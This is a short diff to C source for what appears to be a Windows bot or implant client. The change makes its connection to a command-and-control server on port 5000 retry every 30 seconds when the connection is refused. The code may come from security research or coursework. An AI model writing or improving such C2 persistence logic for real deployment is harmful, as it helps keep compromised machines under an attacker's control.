@@ -7,6 +7,7 @@
 #include "logger.h"
 
 #define CNC_PORT "5000"
+#define SLEEP_INTERVAL_ON_CONNREFUSED_MS 30 * 1000
 
 SOCKET cnc_sock = INVALID_SOCKET;
 
@@ -76,13 +77,27 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
         exit(EXIT_FAILURE);
     }
 
-    ret = connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen);
-    if (ret == SOCKET_ERROR)
+    while (TRUE)
     {
-        log_error("Error at connect(): %ld\n", WSAGetLastError());
-        closesocket(cnc_sock);
-        WSACleanup();
-        exit(EXIT_FAILURE);
+        ret = connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen);
+        if (ret == SOCKET_ERROR)
+        {
+            ret = WSAGetLastError();
+            if (ret != WSAECONNREFUSED)
+            {
+                log_error("Error at connect(): %ld\n", ret);
+                closesocket(cnc_sock);
+                WSACleanup();
+                exit(EXIT_FAILURE);
+            }
+            else
+            {
+                log_warning("Failed to connect to CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNREFUSED_MS / 1000);
+                Sleep(SLEEP_INTERVAL_ON_CONNREFUSED_MS);
+            }
+        }
+        else
+            break;
     }
 }
 
